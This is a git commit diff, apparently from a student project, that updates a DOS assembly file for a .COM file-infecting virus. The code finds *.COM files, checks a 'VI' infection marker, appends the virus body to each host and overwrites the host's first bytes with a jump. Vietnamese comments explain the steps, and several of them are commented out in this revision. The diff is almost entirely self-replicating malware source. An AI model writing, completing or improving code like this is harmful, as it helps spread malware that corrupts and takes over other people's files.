31fdb8fa0ef6301158050ec75b972ecfddaf4b8b
Đỗ Minh Quân <dominhquan@users.noreply.github.com>
2014-10-12 18:10:00 +0700

    Update Virus-II.asm

--- Virus/Project Virus/Virus-II.asm
+++ Virus/Project Virus/Virus-II.asm
@@ -1,23 +1,34 @@
 .model small
-.code    
+.code 
+   
     ORG 100H  
     
 START:  
-  jmp near ptr FIND_BEGIN     
-MARKER  db 78FFH
+  jmp near ptr START_VIRUS    
+  db 'VI' 
+  db      100H dup (90H)  ;force above jump to be near with 256 nop's
+  mov     ax,4C00H
+  int     21H    
   
-VIRUS:       ;virus label   
+VIRUS:       ;virus label        
 
-DATA_ARRAY DB 0,0,0,0,0
+DATA_ARRAY DB 0,0,0,0,0    
 
-FIND_BEGIN:
+START_VIRUS:
     call EXECUTE
     
 EXECUTE:    
     pop di   
     sub di,offset EXECUTE
-    call FIND_FILE
-       
+    call FIND_FILE  
+;    
+;START_CODE:
+;    nop 
+;    nop
+;    nop 
+;    nop
+;    nop
+           
 FIND_FILE:
     mov ah,4EH
     lea dx,[di+OFFSET COM_FILE]
@@ -29,13 +40,18 @@ FIND_LOOP:
     int 21H 
     mov bx,ax            ; put file handle vao bx    
     
-CHECK_FILE:              ; check 5 byte cua virus (virus's marker)
+CHECK_FILE:              ; check 5 byte ban dau.
     mov ah,3FH
     mov cx,5
-    lea dx,[bp+TERMINATE]
+    lea dx,[di+DATA_ARRAY]
     int 21h 
-    cmp [word ptr bp+TERMINATE],78FFH
-    je  short CLOSE_FILE ; file da infected, move to next file.
+   
+    cmp word ptr [di+DATA_ARRAY],0E9H
+    je  short CLOSE_FILE
+    cmp word ptr [di+DATA_ARRAY+3],'IV'
+    je  short CLOSE_FILE                    ; file da infected, move to next file.
+    mov si,word ptr [di+DATA_ARRAY]                  ; else store at si 
+    push si                                 ; push si to stack
     
     xor cx,cx
     xor dx,dx            ; cx:dx=0
@@ -46,35 +62,23 @@ CHECK_FILE:              ; check 5 byte cua virus (virus's marker)
     lea dx,[di+VIRUS]                       ; bat dau tu label virus
     mov ah,40H
     int 21H    
-    jc  short CLOSE_FILE     
-    
-    xor cx,cx
-    mov dx,[bp+1AH]
-    add dx,offset ORIGIN_CODE - offset VIRUS
-    mov ax,4200H
-    int 21H                                 ; move pointer ve dau file
-    
-    mov cx,5                ; write 5 bytes at the beginning (origin host)
-    lea dx,[di+DATA_ARRAY]  ; bat dau tu data_array
-    mov ah,40H              ; write sau code virus
-    int 21H
-    
+    jc  short CLOSE_FILE 
     
     xor cx,cx
     xor dx,dx
     mov ax,4200H
     int 21H              ; move back ve dau host, dat lenh jmp
     
-    mov byte ptr [di+DATA_ARRAY],0E9H    ; set 3 byte dau tien la lenh jmp(co opcode 0E9H)  
-    mov ax,[bp+1AH]
-    add ax,offset FIND_BEGIN - offset VIRUS -3
-    mov word ptr [di+DATA_ARRAY+1],ax
-    mov word ptr [di+DATA_ARRAY+3],4956H
+;    mov byte ptr [di+DATA_ARRAY],0E9H    ; set 3 byte dau tien la lenh jmp(co opcode 0E9H)  
+;    mov ax,[bp+1AH]
+;    add ax,offset START_VIRUS - offset VIRUS -3
+;    mov word ptr [di+DATA_ARRAY+1],ax
+;    mov word ptr [di+DATA_ARRAY+3],4956H
     
-;    mov cx,5                      ; set 5 bytes ghi vo host
-;    lea dx,[di+DATA_ARRAY]        ; tai vi tri data_array
-;    mov ah,40H
-;    int 21H                       ; ghi
+    mov cx,5                      ; set 5 bytes ghi vo host
+    lea dx,[di+OFFSET START]      ; tai vi tri data_array
+    mov ah,40H
+    int 21H                       ; ghi
     
 CLOSE_FILE:    
     mov ah,3EH      
@@ -84,20 +88,19 @@ CLOSE_FILE:
     jmp FIND_LOOP  
          
 DONE:
-    mov ah,1AH                      ; restore DTA
-    mov dx,80H
-    int 21H
-    mov si,offset START             ; restore 
-    push si
-    lea si,[bp+TERMINATE]
-    movsw
-    movsw
-    movsb     
+;    mov ah,1AH                      ; restore DTA
+;    mov dx,80H
+;    int 21H
+;    mov si,offset START             ; restore 
+;    push si
+;    lea si,[bp+TERMINATE]
+;    movsw
+;    movsw
+;    movsb     
     ret                             ; tra lai access cho host
         
     
-COM_FILE    DB      '*.COM',0      
-TERMINATE   DB 0B8H,00H,4CH,0CDH,21H  ;0CDH : release file set,4CH: exit,
+COM_FILE    DB      '*.COM',0
 
         
 ENDVIR:  
